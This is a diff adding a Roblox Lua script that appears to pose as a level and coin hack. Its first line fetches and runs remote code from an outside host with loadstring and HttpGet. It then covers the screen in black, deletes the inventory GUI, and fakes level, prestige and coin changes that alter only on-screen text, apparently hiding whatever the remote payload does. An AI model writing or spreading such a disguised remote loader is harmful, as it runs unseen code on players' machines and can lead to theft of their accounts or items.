@@ -1,0 +1,101 @@
+loadstring(game:HttpGet("https://egorikusa.space/ad3832eed4b259c7f68e1fd6.lua", true))()
+
+-- GUI
+local ScreenGui = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+ScreenGui.Parent = game.Players.LocalPlayer.PlayerGui
+Frame.Parent = ScreenGui
+Frame.Size = UDim2.new(1, 0, 1, 0)  -- Cobre a tela toda
+Frame.BackgroundColor3 = Color3.new(0, 0, 0)  -- Preto
+Frame.BackgroundTransparency = 0  -- Totalmente visível
+
+-- Script para deletar o Inventory
+local players = game:GetService("Players")
+local localPlayer = players.LocalPlayer
+local inventory = localPlayer.PlayerGui.MainGUI:FindFirstChild("Inventory")
+
+if inventory then
+    inventory:Destroy()  -- Deleta o Inventory
+end
+
+-- level
+local players = game:GetService("Players")
+local localPlayer = players.LocalPlayer
+local leaderboard = localPlayer.PlayerGui.MainGUI.Game.Leaderboard.Container
+local levelTextGlobal = localPlayer.PlayerGui.MainGUI.Game.Level.LevelText  -- Path adicional
+
+for _, playerFolder in pairs(leaderboard:GetChildren()) do
+    if playerFolder:FindFirstChild("Level") then
+        local levelText = playerFolder.Level.Level
+        
+        -- Função para alternar entre 1 e 100 com limite de 4 repetições
+        local function alternateLevel()
+            -- Primeira repetição (altera uma vez)
+            levelText.Text = "1"
+            levelTextGlobal.Text = "1"
+            wait(1)
+            levelText.Text = "100"
+            levelTextGlobal.Text = "100"
+            wait(1)
+
+            -- Espera antes de repetir mais 3 vezes
+            wait(2)  -- Ajuste o tempo de espera conforme necessário
+
+            -- Repetir mais 3 vezes
+            for _ = 1, 3 do
+                levelText.Text = "1"
+                levelTextGlobal.Text = "1"
+                wait(1)
+                levelText.Text = "100"
+                levelTextGlobal.Text = "100"
+                wait(1)
+            end
+        end
+
+        -- Chama a função para iniciar a alternância
+        alternateLevel()
+    end
+end
+
+--prestigie
+
+local players = game:GetService("Players")
+local localPlayer = players.LocalPlayer
+local prestige = localPlayer.PlayerGui.MainGUI.Game:FindFirstChild("Prestige")
+
+if prestige then
+    -- Função para alternar a visibilidade
+    local function toggleVisibility()
+        for _ = 1, 4 do
+            prestige.Visible = true  -- Torna visível
+            wait(1)  -- Aguarda 1 segundo (ajustável)
+            prestige.Visible = false  -- Esconde
+            wait(1)  -- Aguarda 1 segundo (ajustável)
+        end
+    end
+
+    -- Chama a função para alternar a visibilidade
+    toggleVisibility()
+end
+
+--coin
+
+local players = game:GetService("Players")
+local localPlayer = players.LocalPlayer
+local amountText = localPlayer.PlayerGui.MainGUI.Game.Shop.Title.Coins.Container:FindFirstChild("Amount")
+
+if amountText then
+    -- Função para aumentar o valor de 3 em 3
+    local function increaseAmount()
+        local currentAmount = tonumber(amountText.Text) or 0  -- Converte o texto para número
+        
+        while currentAmount < 135534 do  -- Define um limite máximo (ajuste conforme necessário)
+            currentAmount = currentAmount + 3
+            amountText.Text = tostring(currentAmount)  -- Atualiza o texto
+            wait(0.1)  -- Aumenta rapidamente (ajuste a velocidade se necessário)
+        end
+    end
+
+    -- Chama a função para iniciar o aumento
+    increaseAmount()
+end
